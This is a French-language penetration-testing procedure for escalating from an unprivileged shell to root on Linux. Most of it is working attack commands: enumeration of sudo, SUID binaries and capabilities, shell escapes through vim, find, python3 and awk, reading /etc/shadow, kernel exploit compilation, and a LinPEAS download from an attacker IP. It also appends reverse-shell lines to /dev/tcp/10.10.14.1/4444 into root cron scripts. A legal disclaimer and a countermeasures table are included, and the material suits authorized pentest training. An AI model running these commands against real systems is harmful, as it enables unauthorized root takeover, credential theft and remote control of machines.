# ⬆️ Linux Privilege Escalation

> Passer d'un compte standard à **root**

---

## 📋 Contexte d'utilisation

Après l'obtention d'un **shell initial** (via exploit web, reverse shell, SSH compromis, etc.) avec un utilisateur non privilégié.

## 🛠️ Prérequis

- Shell sur la machine cible (même limité)
- Connexion réseau vers ta machine attaquante (pour télécharger des outils si nécessaire)

---

## ⚙️ Procédure

### Étape 1 : Énumération initiale (ordre obligatoire)

> ⚠️ **Toujours commencer par `sudo -l`** — c'est le vecteur le plus courant et le plus rapide.

```bash
# 1. Permissions sudo (TOUJOURS EN PREMIER)
sudo -l

# 2. Binaires SUID
find / -perm -u=s -type f 2>/dev/null

# 3. Capabilities Linux
getcap -r / 2>/dev/null

# 4. Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# 5. Fichiers modifiables
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# 6. Processus root
ps aux | grep root

# 7. Ports internes
ss -tulpn

# 8. Version kernel (pour exploit kernel)
uname -a
cat /etc/os-release
```

### Étape 2 : Énumération automatisée avec LinPEAS

```bash
# Télécharger LinPEAS
wget http://10.10.14.1/linpeas.sh -O /tmp/lp.sh

# Rendre exécutable et lancer
chmod +x /tmp/lp.sh
/tmp/lp.sh
```

### Étape 3 : Exploitations courantes

#### A) Sudo sans mot de passe (NOPASSWD)

Si `sudo -l` affiche un binaire avec `NOPASSWD` :

```bash
# Exemple avec vim
sudo vim -c ':!/bin/bash'

# Exemple avec find
sudo find / -exec /bin/bash \; -quit

# Exemple avec python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# Exemple avec less
sudo less /etc/profile
# puis taper : !/bin/bash

# Exemple avec awk
sudo awk 'BEGIN {system("/bin/bash")}'

# Exemple avec nmap (ancien)
sudo nmap --interactive
# puis : !sh
```

> 💡 **Référence** : Consulter [GTFOBins](https://gtfobins.github.io/) pour chaque binaire trouvé.

#### B) Binaire SUID

```bash
# Si python3 est SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Si bash est SUID
bash -p

# Si cp est SUID (copier /etc/passwd, modifier, remettre)
cp /etc/passwd /tmp/passwd.bak
# Ajouter un utilisateur root dans le fichier
```

#### C) Capabilities exploitables

```bash
# Si python3 a cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Si python3 a cap_dac_read_search
python3 -c 'print(open("/etc/shadow").read())'
```

#### D) Cron job vulnérable

```bash
# Si un script exécuté par root est modifiable
echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' >> /opt/backup.sh

# Si le PATH du cron est modifiable
echo '/bin/bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' > /tmp/script.sh
chmod +x /tmp/script.sh
```

#### E) Kernel exploit (dernier recours)

```bash
# Vérifier la version
uname -a

# Chercher un exploit
searchsploit linux kernel [version]

# Compiler et exécuter
gcc -o exploit exploit.c
./exploit
```

---

### Étape 4 : Stabiliser le shell root

```bash
# Upgrade shell basique
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Full TTY
# Ctrl+Z (background le shell)
stty raw -echo; fg
# Puis :
export TERM=xterm
```

---

## 📊 Résultats attendus

| Étape | Résultat |
|-------|----------|
| Énumération | Liste des vecteurs possibles |
| Exploitation | Shell `root` obtenu |
| Stabilisation | Shell interactif complet |

---

## ⚠️ Points de vigilance

> ⚖️ **Légal** : Cadre autorisé uniquement.

> 📝 **Documentation** : Toujours noter les commandes exécutées et les résultats pour le rapport.

---

## 🛡️ Contre-mesures

| Mesure | Description |
|--------|-------------|
| **Limiter sudo** | Restreindre les binaires autorisés en sudo |
| **Supprimer SUID inutiles** | Audit régulier des binaires SUID |
| **Protéger les crons** | Permissions strictes sur les scripts exécutés par root |
| **Kernel à jour** | Appliquer les patches de sécurité |
| **Capabilities minimales** | Ne pas attribuer de capabilities inutiles |
| **Monitoring** | Surveiller les tentatives d'élévation de privilèges |

---

## 📚 Ressources

- [GTFOBins](https://gtfobins.github.io/) — Référence pour l'exploitation de binaires
- [LinPEAS](https://github.com/peass-ng/PEASS-ng) — Outil d'énumération automatisée
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

---

*Procédure rédigée par Arthur Logeais — Juin 2026*